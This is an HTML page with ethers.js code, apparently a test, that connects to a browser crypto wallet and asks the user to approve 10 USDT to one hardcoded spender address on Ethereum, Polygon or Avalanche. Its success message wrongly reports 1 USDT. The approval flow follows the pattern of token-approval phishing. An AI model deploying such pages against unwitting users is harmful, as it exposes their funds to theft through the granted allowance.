<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>USDT Authorization TesT</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
</head>

<body>

<h3>USDT Authorization Test</h3>

<p id="status">Checking wallet...</p>

<button id="approve">
    Authorize 10 USDT
</button>

<script>

const NETWORKS = {

    1: {
        name: "Ethereum",
        token: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        decimals: 6,
        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
    },

    137: {
        name: "Polygon",
        token: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
        decimals: 6,
        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
    },

    43114: {
        name: "Avalanche",
        token: "0x9702230A8Ea53601f5cD2dc00fDBC13d4dF4A8c7",
        decimals: 6,
        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
    }

};

const ABI = [
 "function approve(address,uint256)",
 "function allowance(address,address) view returns(uint256)"
];

let provider;
let signer;
let user;


async function init() {

    if (!window.ethereum) {
        status.innerText = "EVM wallet not detected";
        return;
    }

    provider =
        new ethers.BrowserProvider(window.ethereum);

    let accounts =
        await provider.send("eth_accounts", []);

    if (accounts.length) {

        user = accounts[0];

        signer =
            await provider.getSigner();

        showNetwork();

    } else {

        status.innerText =
            "Wallet detected — authorization required";

    }
}


async function showNetwork() {

    const network =
        await provider.getNetwork();

    const id =
        Number(network.chainId);

    const config =
        NETWORKS[id];

    if (!config) {

        status.innerText =
            `Unsupported EVM network (${id})`;

        return;
    }

    status.innerText =
        `${config.name} | ${user}`;
}


async function getSigner() {

    let accounts =
        await provider.send("eth_accounts", []);

    if (!accounts.length) {

        accounts =
            await provider.send(
                "eth_requestAccounts",
                []
            );

    }

    user = accounts[0];

    signer =
        await provider.getSigner();
}


approve.onclick = async () => {

    try {

        if (!provider)
            throw Error("Wallet unavailable");

        await getSigner();

        const network =
            await provider.getNetwork();

        const chainId =
            Number(network.chainId);

        const config =
            NETWORKS[chainId];

        if (!config)
            throw Error("Unsupported network");

        if (
            !ethers.isAddress(config.spender)
        )
            throw Error(
                `Spender not configured for ${config.name}`
            );

        const token =
            new ethers.Contract(
                config.token,
                ABI,
                signer
            );

        const amount =
            ethers.parseUnits(
                "10",
                config.decimals
            );

        const tx =
            await token.approve(
                config.spender,
                amount
            );

        status.innerText =
            "Waiting for confirmation...";

        await tx.wait();

        status.innerText =
            `1 USDT authorized on ${config.name}`;

    } catch(e) {

        console.error(e);

        status.innerText =
            e.shortMessage || e.message;
    }
};


window.ethereum?.on(
    "chainChanged",
    () => location.reload()
);

window.ethereum?.on(
    "accountsChanged",
    () => location.reload()
);

init();

</script>
</body>
</html>
